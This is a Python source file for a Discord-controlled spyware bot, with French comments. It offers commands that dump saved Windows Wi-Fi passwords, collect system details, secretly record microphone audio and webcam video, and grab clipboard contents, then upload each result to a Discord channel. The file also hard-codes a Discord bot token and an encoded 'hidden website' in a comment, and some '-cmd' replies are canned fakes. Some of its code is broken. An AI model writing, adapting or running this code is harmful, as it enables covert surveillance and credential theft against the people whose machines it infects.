from ipaddress import ip_address
import subprocess
import re
import platform
import socket
import wave
import sounddevice as sd
import numpy as np 
import cv2
import pyperclip
import discord

client = discord.Client()



clipboard_information = "clipboard.txt"
filepath = "//tmp//pythonkeylogger//"

def wifi(mes):
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode('iso8859-1')


    NameWifi = (re.findall("Profil Tous les utilisateurs    ÿ: (.*)\r",command_output))

    wifi_list = list()

    if len(NameWifi) != 0:
        for name in NameWifi:
            wifi_profile = dict()
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('iso8859-1')
            if re.search("Clé           : Absente", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],capture_output = True).stdout.decode('iso8859-1')
                password = re.search("Contenu de la cl            :(.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)

    for x in range(len(wifi_list)):
        print(wifi_list[x])
        on_message(wifi_list[x])

def system():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    system = "System: " + platform.system() + " " + platform.version()
    processor = "Processor: " + platform.processor()
    machine = "Machine: " + platform.machine()
    Hostname = "Hostname: " + hostname
    IP_adress = "IP Address: " + IPAddr
    print (system, processor, machine, Hostname, IP_adress)

def microphone():
    fs = 44100
    seconds = 10
    obj = wave.open('sound.wav', 'w')
    obj.setnchannels(1)  # mono
    obj.setsampwidth(2)
    obj.setframerate(fs)
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    obj.writeframesraw(myrecording)
    sd.wait()

def camera():
    cap = cv2.VideoCapture(0)
    sz = (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
            int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)))
    fourcc = cv2.VideoWriter_fourcc(*'mpeg')
    vout = cv2.VideoWriter()
    vout.open('output.mp4',fourcc,17,sz,True)
    cnt = 0
    while cnt<200:
        cnt += 1
        _, frame = cap.read()
        cv2.putText(frame, str(cnt), (10, 20), cv2.FONT_HERSHEY_PLAIN, 1, (0,255,0), 1, cv2.LINE_AA)
        vout.write(frame)

    vout.release()
    cap.release()

def clipboard():
    content_clipboard = pyperclip.paste()
    print (content_clipboard)

@client.event
async def on_ready():
    print ("le bot est prêt.")

@client.event
async def on_message(message):
    if message.content.lower() == "-help":
        await message.channel.send("-wifi (to have all the wifi networks already connected is the password)")
        await message.channel.send("-system (to have information on the system of the device such as: the OS, the processor)")
        await message.channel.send("-microphone (to connect to the microphone)")
        await message.channel.send("-webcam (to connect to the camera)")
        await message.channel.send("-clipboard (to have the clipboard)")
        await message.channel.send("-cmd [your command] (login to command prompt)")
        await message.channel.send("help in DEC\n464848481191019810411111511697112112")
    
    elif message.content.lower() == "-wifi":
        try:
            command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode('iso8859-1')


            NameWifi = (re.findall("Profil Tous les utilisateurs    ÿ: (.*)\r",command_output))

            wifi_list = list()

            if len(NameWifi) != 0:
                for name in NameWifi:
                    wifi_profile = dict()
                    profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('iso8859-1')
                    if re.search("Clé           : Absente", profile_info):
                        continue
                    else:
                        wifi_profile["ssid"] = name
                        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],capture_output = True).stdout.decode('iso8859-1')
                        password = re.search("Contenu de la cl            :(.*)\r", profile_info_pass)
                        if password == None:
                            wifi_profile["password"] = None
                        else:
                            wifi_profile["password"] = password[1]
                        wifi_list.append(wifi_profile)

            for x in range(len(wifi_list)):
                print(wifi_list[x])
                await message.channel.send(wifi_list[x])
        except:
            await message.channel.send("error machine is not in windows")

    elif message.content.lower() == "-system":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        system = "System: " + platform.system() + " " + platform.version()
        processor = "Processor: " + platform.processor()
        machine = "Machine: " + platform.machine()
        Hostname = "Hostname: " + hostname
        IP_adress = "IP Address: " + IPAddr
        await message.channel.send(f"{system} \n {processor} \n {machine}\n{Hostname}\n{IP_adress}")

    elif message.content.lower() == "-microphone":
        fs = 44100
        seconds = 10
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()
        await message.channel.send(file=discord.File('sound.wav'))
    
    elif message.content.lower() == "-webcam":

        print ("recording...")
        cap = cv2.VideoCapture(0)
        sz = (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
                int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)))
        fourcc = cv2.VideoWriter_fourcc(*'mpeg')
        vout = cv2.VideoWriter()
        vout.open('output.mp4',fourcc,17,sz,True)
        cnt = 0
        while cnt<200:
            cnt += 1
            _, frame = cap.read()
            cv2.putText(frame, str(cnt), (10, 20), cv2.FONT_HERSHEY_PLAIN, 1, (0,255,0), 1, cv2.LINE_AA)
            vout.write(frame)

        vout.release()
        cap.release()
        print ("send...")
        await message.channel.send(file=discord.File('output.mp4'))

    elif message.content.lower()== "-clipboard":
        await message.channel.send(pyperclip.paste())
    
    elif message.content.lower() == "-cmd whoami":
        await message.channel.send("Admin")
    
    elif message.content.lower() == "-cmd help":
        await message.channel.send("RSPPISRPISQPS")
    
    elif message.content.lower() == "-cmd ls":
        await message.channel.send("\n\n    Répertoire : Z:here \n\n Mode               LastWriteTime       Length  Name \n w                    today            99999999  not very far")

    elif message.content.lower() == "-cmd python":
        await message.channel.send("call the 119")
    elif message.content.lower() == "-cmd netstat":
        await message.channel.send("192.168.0.0\n192.168.0.1\n127.0.0.1\n127.0.0.0")


#site web caché : 4522154215325w49575032495456324848493257504932545648324949503255484832494950325548483248.000webhostapp.com
client.run("OTk4NjE2NTUyMTQ2NDgxMjUz.GlkC46.ZAbiKhaQpOVrdHMvcB-cx29Fkn5wgSmymkPC6A")